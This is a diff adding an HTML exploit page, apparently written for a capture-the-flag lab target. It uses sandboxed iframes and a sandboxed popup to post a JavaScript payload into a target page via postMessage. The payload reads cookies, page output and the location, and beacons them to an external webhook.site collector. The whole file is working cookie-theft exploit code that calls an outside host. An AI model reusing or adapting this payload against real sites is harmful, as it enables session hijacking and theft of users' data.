@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>po</title></head>
+<body>
+<script>
+var W = 'https://webhook.site/d3d945c5-0e53-44db-b896-4f59a840e62a';
+var T = 'https://d992cf0a49b5.pwnbox-lab.com/';
+
+function beacon(tag, data) {
+  try { (new Image()).src = W + '?tag=' + tag + '&d=' + encodeURIComponent(String(data)); } catch (e) {}
+}
+beacon('load', navigator.userAgent + ' || ' + location.href);
+
+// Runs inside the sandboxed (opaque) frame that requested the instance page.
+var PAYLOAD =
+  "var o={};" +
+  "try{o.ck=document.getElementById('cookies').textContent}catch(e){o.ck='ERR:'+e.name};" +
+  "try{o.out=document.getElementById('output').textContent}catch(e){};" +
+  "try{o.href=location.href}catch(e){};" +
+  "try{o.wo=String(window.origin)}catch(e){};" +
+  "try{o.doc=document.cookie}catch(e){o.doc='ERR:'+e.name};" +
+  "try{o.html=document.documentElement.outerHTML.length}catch(e){};" +
+  "var i=new Image();i.src='" + W + "?tag=hit&d='+encodeURIComponent(JSON.stringify(o));";
+
+// A: sandboxed iframe -> opaque target, opaque sender
+var f = document.createElement('iframe');
+f.setAttribute('sandbox', 'allow-scripts allow-popups');
+f.src = T;
+f.style = 'width:1px;height:1px;border:0';
+document.body.appendChild(f);
+
+function fireA(tag) {
+  var s = document.createElement('iframe');
+  s.setAttribute('sandbox', 'allow-scripts');
+  s.style = 'display:none';
+  s.srcdoc = '<scr' + 'ipt>try{parent.frames[0].postMessage(' + JSON.stringify(PAYLOAD) + ',"*")}catch(e){new Image().src="' + W + '?tag=senderr&d="+encodeURIComponent(e.name)}</scr' + 'ipt>';
+  document.body.appendChild(s);
+}
+setTimeout(function () { fireA('a1'); }, 3000);
+setTimeout(function () { fireA('a2'); }, 7000);
+
+// B: sandboxed popup (top-level navigation => SameSite=Lax cookie is sent), inherits sandbox => opaque
+var SENDER =
+  "var p=null;try{p=window.open('" + T + "','pp'+Math.random())}catch(e){new Image().src='" + W + "?tag=open-threw&d='+encodeURIComponent(e.name)}" +
+  "if(!p){new Image().src='" + W + "?tag=popupblocked'}" +
+  "else{new Image().src='" + W + "?tag=popupok';" +
+  "setTimeout(function(){try{p.postMessage(" + JSON.stringify(PAYLOAD) + ",'*');new Image().src='" + W + "?tag=post1'}catch(e){new Image().src='" + W + "?tag=posterr&d='+encodeURIComponent(e.name)}},4000);" +
+  "setTimeout(function(){try{p.postMessage(" + JSON.stringify(PAYLOAD) + ",'*');new Image().src='" + W + "?tag=post2'}catch(e){}},8000);}";
+
+var s2 = document.createElement('iframe');
+s2.setAttribute('sandbox', 'allow-scripts allow-popups');
+s2.style = 'display:none';
+s2.srcdoc = '<scr' + 'ipt>' + SENDER + '</scr' + 'ipt>';
+document.body.appendChild(s2);
+</script>
+</body>
+</html>
